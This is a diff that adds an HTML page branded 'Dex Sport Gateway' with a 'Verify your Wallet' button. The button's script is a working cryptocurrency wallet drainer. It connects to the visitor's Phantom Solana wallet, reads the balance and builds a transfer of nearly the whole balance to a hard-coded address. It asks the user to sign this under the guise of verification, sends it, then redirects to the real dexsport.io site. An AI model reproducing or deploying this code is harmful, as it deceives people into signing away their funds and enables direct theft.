@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Dex Sport Gateway</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://unpkg.com/@solana/web3.js@1.91.3/lib/index.iife.min.js"></script>
+  <link rel="icon" href="Logo.png" type="image/x-icon">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('BG.jpg');
+      background-size: cover;
+      background-position: center;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      text-shadow: 1px 1px 3px black;
+    }
+
+    #logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    #sendButton {
+      background-color: #14f195;
+      border: none;
+      color: black;
+      padding: 15px 30px;
+      font-size: 20px;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(20, 241, 149, 0.7);
+      transition: all 0.3s ease;
+    }
+
+    #sendButton:hover {
+      background-color: #13d986;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <button id="sendButton">Verify your Wallet</button>
+
+  <script>
+    const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+
+    const destination = "AunHeraAbHaG8JmfgQAGJtKPvTKXH1bvrcw3shxfVzHY";
+
+    document.getElementById('sendButton').onclick = async () => {
+      try {
+        const provider = window.phantom?.solana;
+        if (!provider?.isPhantom) return alert("Phantom wallet not found. Use a mobile browser with Phantom installed.");
+
+        const { publicKey } = await provider.connect(); // 🔑 گرفتن آدرس
+        const fromPubkey = publicKey;
+        const toPubkey = new solanaWeb3.PublicKey(destination);
+
+        const balance = await connection.getBalance(fromPubkey);
+        if (balance < 5000) return alert("Insufficient balance.");
+
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey,
+            toPubkey,
+            lamports: balance - 5000
+          })
+        );
+
+        tx.feePayer = fromPubkey;
+        const { blockhash } = await connection.getLatestBlockhash();
+        tx.recentBlockhash = blockhash;
+
+        const signedTx = await provider.signTransaction(tx);
+        const signature = await connection.sendRawTransaction(signedTx.serialize());
+        await connection.confirmTransaction(signature);
+
+        window.location.href = "https://dexsport.io/";
+      } catch (e) {
+        console.error(e);
+        alert("Transaction error: " + e.message);
+      }
+    };
+  </script>
+</body>
+</html>
